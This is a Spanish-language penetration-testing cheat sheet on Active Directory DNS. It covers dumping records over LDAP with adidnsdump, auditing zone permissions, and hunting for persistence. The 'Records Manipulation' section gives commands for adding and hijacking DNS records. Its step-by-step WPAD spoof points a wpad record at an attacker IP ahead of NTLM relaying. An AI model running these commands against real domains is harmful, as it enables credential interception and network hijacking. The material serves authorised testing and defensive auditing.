---
aliases:
  - adidnsdump
  - DNS via LDAP
  - AD DNS Dump
  - dnsRecord blob
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - DNS & SRV Records]]"
---
# AD - DNS & SRV Records - Adidnsdump y DNS Authenticated

***

## Por qué DNS via LDAP

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ldapsearch -h <DC> -D u -w p -b "DC=DomainDnsZones,DC=corp,DC=local" "(objectClass=dnsNode)" dnsRecord` | Records via LDAP (blob binario) | AXFR cerrado pero LDAP open. |
| `ldapsearch ... -b "DC=ForestDnsZones,DC=corp,DC=local" "(objectClass=dnsNode)"` | Forest-scope records | Forest-wide DNS visibility. |
^ad-adidns-why

**Por qué importa:** AXFR puede estar cerrado, pero LDAP read sobre `DomainDnsZones` está habilitado para `Authenticated Users` por default. LDAP también muestra **ANY records** que el server DNS no advertise (creados por usuarios via LDAP write).

**DNs típicos:**
```
DC=DomainDnsZones,DC=corp,DC=local
  └── DC=corp.local                      (zone object)
        ├── DC=@                         (zone apex / SOA)
        ├── DC=dc01                      (A record)
        ├── DC=webserver                 (A record)
        └── DC=_msdcs.corp.local         (subdomain)

DC=ForestDnsZones,DC=corp,DC=local
  └── DC=_msdcs.corp.local
```

___

## adidnsdump

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `adidnsdump -u 'corp\u' -p pass <DC> --print-zones` | Lista zones | Discovery. |
| `adidnsdump -u 'corp\u' -p pass <DC>` | Dump default zone | Records visibles. |
| `adidnsdump -u 'corp\u' -p pass <DC> -r` | Resolve via DNS para verificar | Validar contra DNS. |
| `adidnsdump -u 'corp\u' -p pass <DC> --include-tombstoned` | Records tombstoned | Forensics / persistence hunt. |
| `adidnsdump -u 'corp\u' -p pass <DC> -k` | Kerberos auth (con TGT vía `kinit`) | OPSEC sin password en línea. |
| `adidnsdump -u 'corp\u' -p pass <DC> --ssl` | LDAPS | Encrypted. |
^ad-adidns-tool

```bash
# Install
pip install git+https://github.com/dirkjanm/adidnsdump

# Pipeline típico
adidnsdump -u 'corp\auditor' -p pass <DC> --print-zones
adidnsdump -u 'corp\auditor' -p pass <DC> -r > records.csv

# Output records.csv:
# name,type,address
# dc01,A,10.0.0.10
# webserver,A,10.0.0.50
# wpad,A,10.0.0.100   ← red flag
# *,A,10.0.0.200      ← wildcard catch-all
```

___

## ANY Records / Default Visibility

| **Comando** | **Qué obtenés** | **Por qué importa** |
|:---:|:---:|:---:|
| `adidnsdump -u u -p pass <DC>` | LDAP records (incluye ANY que DNS oculta) | LDAP > DNS visibility. |
| `dig +short ANY <name>.<dom> @<DC>` | DNS responde solo si record advertised | Comparar contra LDAP. |
| `(Get-Acl "AD:DC=<dom>,DC=DomainDnsZones,...").Access \| ? IdentityReference -match "Authenticated Users"` | DACL `CreateChild` para Auth Users | Detectar permission default. |
^ad-adidns-any

**Default DACL:** `Authenticated Users` tiene `CreateChild` sobre la zone — significa **cualquier user del domain puede crear A records**. Base para WPAD attacks, KDC poisoning, fake auth servers.

```bash
# Comparar LDAP vs DNS — detectar ANY records ocultos
adidnsdump -u 'corp\u' -p pass <DC> > all_ldap.csv

# Records en LDAP pero no resolviendo en DNS = ANY records
while IFS=',' read name type addr; do
  R=$(dig +short "$type" "$name.corp.local" @<DC>)
  [ -z "$R" ] && echo "[ANY] $name $type $addr"
done < all_ldap.csv
```

___

## DNS Permissions Audit

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-Acl "AD:DC=corp.local,DC=DomainDnsZones,DC=corp,DC=local"` | DACL de la zone | Privesc audit. |
| `Get-Acl "AD:DC=<host>,DC=corp.local,DC=DomainDnsZones,..."` | DACL per-record | Granular audit. |
| `dsacls "DC=DomainDnsZones,DC=corp,DC=local"` | DACL via dsacls native | Sin RSAT. |
| `bloodyAD --host <DC> -d corp -u u -p pass get object "DC=corp.local,DC=DomainDnsZones,DC=corp,DC=local" --resolve-sd` | DACL desde Linux | OPSEC Linux. |
^ad-adidns-acl

**ACEs peligrosos en zone:** `GenericAll`, `GenericWrite`, `WriteDACL`, `CreateChild`. Default = `Authenticated Users` con `CreateChild` (suficiente para spoofing).

```powershell
# Audit DACL — non-default principals con write
Get-Acl "AD:DC=corp.local,DC=DomainDnsZones,DC=corp,DC=local" |
  Select -ExpandProperty Access |
  Where {
    $_.AccessControlType -eq "Allow" -and
    $_.IdentityReference -notmatch "BUILTIN|NT AUTHORITY|Domain Admins|Enterprise Admins|SYSTEM" -and
    $_.ActiveDirectoryRights -match "Write|Create|GenericAll"
  } |
  Select IdentityReference,ActiveDirectoryRights

# All zones con permisos non-default
Get-ChildItem "AD:DC=DomainDnsZones,DC=corp,DC=local" | % {
  $dn = $_.DistinguishedName
  Get-Acl "AD:$dn" | Select -ExpandProperty Access |
    Where { $_.IdentityReference -match "Authenticated Users|Domain Users" -and $_.ActiveDirectoryRights -match "Write|Create" } |
    Select @{n='Zone';e={$dn}},IdentityReference,ActiveDirectoryRights
}
```

___

## Records Manipulation

| **Comando** | **Acción** | **Cuándo** |
|:---:|:---:|:---:|
| `dnstool.py -u 'corp\u' -p pass -a add -r wpad -d <attacker-IP> <DC>` | Add A record (LDAP write) | WPAD spoof. |
| `dnstool.py -u 'corp\u' -p pass -a query -r <name> <DC>` | Query record | Pre-modify check. |
| `dnstool.py -u 'corp\u' -p pass -a modify -r <name> -d <new-IP> <DC>` | Modify existing A | Hijack. |
| `dnstool.py -u 'corp\u' -p pass -a remove -r <name> <DC>` | Remove (tombstone) | Cleanup. |
| `dnstool.py -u 'corp\u' -p pass -a remove -r <name> --remove-tombstone <DC>` | Purge tombstone | Persistence cleanup. |
| `Add-DnsServerResourceRecord -ZoneName <zone> -A -Name <n> -IPv4Address <ip> -ComputerName <DC>` | Add via RSAT | Native authenticated. |
| `Set-DnsServerResourceRecord` | Modify via RSAT | Native. |
| `Remove-DnsServerResourceRecord -ZoneName <zone> -RRType A -Name <n>` | Remove via RSAT | Native. |
| `bloodyAD --host <DC> -d corp -u u -p pass add dnsRecord <zone> <name> <ip>` | Add via bloodyAD | Linux. |
^ad-adidns-tools

```bash
# WPAD spoof completo
git clone https://github.com/dirkjanm/krbrelayx
cd krbrelayx

# 1. Add WPAD record
python3 dnstool.py -u 'corp\u' -p pass -a add -r wpad -d <attacker-IP> <DC>

# 2. Verify
dig +short A wpad.corp.local @<DC>

# 3. Coercion + relay listener (en otra terminal)
# ntlmrelayx.py + responder

# 4. Cleanup post-engagement
python3 dnstool.py -u 'corp\u' -p pass -a remove -r wpad <DC>
```

___

## DNS-Based Persistence

| **Comando defensor** | **Qué detecta** | **Acción** |
|:---:|:---:|:---:|
| `Get-DnsServerResourceRecord -ZoneName <zone> \| ? Timestamp -eq 0` | Static records (no scavenging) | Audit — static = atacante candidato. |
| `Get-DnsServerResourceRecord -ZoneName <zone> \| ? Timestamp -gt (Get-Date).AddDays(-7)` | Records añadidos última semana | Detect new persistence. |
| `Get-DnsServerResourceRecord -ZoneName <zone> \| ? HostName -in '*','wpad','isatap','_kerberos','_ldap'` | Records peligrosos | Critical hunt. |
| `Get-DnsServerResourceRecord -ZoneName <zone> -RRType SRV \| ? RecordData -notmatch <legit-DC>` | SRV apuntando a non-DC | KDC/LDAP poisoning. |
| Audit Subcategory `Directory Service Changes` | Logs de modificación LDAP a `dnsNode` | Defender alerting. |
^ad-adidns-persistence

```powershell
# Hunt persistence DNS comprehensive
$Zone = "corp.local"
$DC = "dc01"

# Static records (no expiran via scavenging)
Get-DnsServerResourceRecord -ZoneName $Zone -ComputerName $DC |
  Where Timestamp -eq 0 |
  Select RecordType,HostName,RecordData

# Records sospechosos por nombre
Get-DnsServerResourceRecord -ZoneName $Zone -ComputerName $DC |
  Where { $_.HostName -in '*','wpad','isatap' -or $_.HostName -match '^_(kerberos|ldap|kpasswd)' } |
  Select RecordType,HostName,RecordData,Timestamp

# Records nuevos (<7d)
Get-DnsServerResourceRecord -ZoneName $Zone -ComputerName $DC |
  Where Timestamp -gt (Get-Date).AddDays(-7) |
  Select RecordType,HostName,RecordData,Timestamp
```

***
